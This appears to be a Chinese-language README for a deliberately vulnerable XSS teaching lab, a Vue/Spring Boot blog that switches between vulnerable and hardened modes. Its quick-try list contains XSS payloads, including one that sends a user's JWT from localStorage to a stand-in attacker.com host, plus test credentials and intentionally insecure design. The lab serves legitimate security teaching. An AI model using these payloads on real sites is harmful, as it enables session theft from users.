# TechBlog - XSS 漏洞演示靶场

<div align="center">

⚠️ 本项目含刻意设计的安全漏洞，仅用于授权的教学与研究。请勿部署到生产或公网。

</div>

---

## 项目简介

- 前端：Vue 3 + Element Plus + Vite
- 后端：Spring Boot 3 + JPA + MySQL 8
- 认证：JWT (HS256)
- 特性：支持 VULN ↔ SECURE 双态切换（对比攻击与防御效果）

架构：前后端分离，RESTful API，数据库初始化由 Spring 自动完成（首启自动建表与灌数据）。

## 快速开始

前置要求：Node.js 20+、JDK 21、MySQL 8.0、Maven 3.9+。

1) 启动 MySQL（root/root）

2) 启动后端
```
cd apps/backend
mvn spring-boot:run
```
访问 `http://localhost:8080`

3) 启动前端
```
cd apps/frontend
npm install
npm run dev
```
访问 `http://localhost:5173`

4) 登录验证（见下方测试账号）

### Docker 一键部署
```
cd deploy
docker-compose up -d
```
访问 `http://localhost`

## 模式切换（VULN / SECURE）

- 页面左上角徽章点击切换（推荐）。切换会自动登出，重新登录即可。
- 或修改配置并重启：
  - 后端 `apps/backend/src/main/resources/application.yml`: `xss.mode: vuln|secure`
  - 前端 `apps/frontend/.env`: `VITE_XSS_MODE=vuln|secure`

对比要点：
- VULN：JWT 存 localStorage；输入直接渲染；无安全响应头；XSS 可成功
- SECURE：JWT 为 HttpOnly Cookie；后端转义 + DOMPurify；CSP + X-Frame-Options + X-XSS-Protection；XSS 被拦截

## 测试账号

- admin / Admin#2025（管理员，用于 L3 后台查看）
- attacker / Attacker#2025（用于 L2 恶意 Bio）
- alice / Admin#2025（普通用户）

## 场景速览（L0~L4）

| 场景 | 类型 | 目标 | 入口 |
|------|------|------|------|
| L0 | 反射型 | 代码执行 | 搜索 URL 参数 |
| L1 | 反射型 | 窃取 JWT | 搜索 + localStorage |
| L2 | 存储型 | 伪装登录钓鱼 | 用户 Bio |
| L3 | 盲 XSS | 管理员凭证窃取 | 反馈 → 后台查看 |
| L4 | 存储型 | 文章评论 XSS | 评论 → 所有访客 |

详细步骤与对比见：`XSS演示场景说明.md`

### 快速体验（示例）
- L0：`/search?q=<img src=x onerror=alert('XSS')>`
- L1：登录后：`/search?q=<img src=x onerror="fetch('https://attacker.com/log?jwt='+localStorage.getItem('accessToken'))">`
- L2：访问 `/profile/attacker` 观察伪装登录框
- L3：提交 `/feedback` 后，用 admin 在 `/admin/feedbacks` 打开详情
- L4：登录后在文章详情页发表评论 `<img src=x onerror=alert('评论XSS')>`

💡 **注意**：Vue 中通过 v-html 插入的 `<script>` 标签不会执行，需使用事件处理器型 payload（如 onerror、onload）。

## 技术栈

**前端**：
- Vue **3.5.13**
- Vite **6.0.5**
- Element Plus **2.9.1**
- Pinia **2.3.0**
- Axios **1.7.9**
- DOMPurify **3.2.3**
- Node **24 LTS**

**后端**：
- Spring Boot **3.5.1**
- Spring Security **6.x**
- JPA/Hibernate
- JJWT **0.12.6**
- MySQL **8.4 LTS**
- JDK **21**
- Maven **3.9+**

**安全防御（SECURE模式）**：
- HttpOnly + Secure + SameSite Cookie
- 后端 HTML 转义（HtmlUtils.htmlEscape）
- 前端白名单过滤（DOMPurify）
- Content Security Policy (CSP)
- X-Frame-Options (防点击劫持)
- X-XSS-Protection (浏览器XSS过滤器)

## 参考
- XSS 场景说明：`XSS演示场景说明.md`
- OWASP XSS 防御指南
- Content Security Policy (CSP)

## 免责声明

本项目仅用于授权的安全研究与教学。使用者须遵守法律法规，产生的后果自负。

**使用前请确认**：
- ✅ 已获得授权
- ✅ 仅在隔离环境中运行
- ✅ 不连接公网
- ✅ 理解其中的安全风险
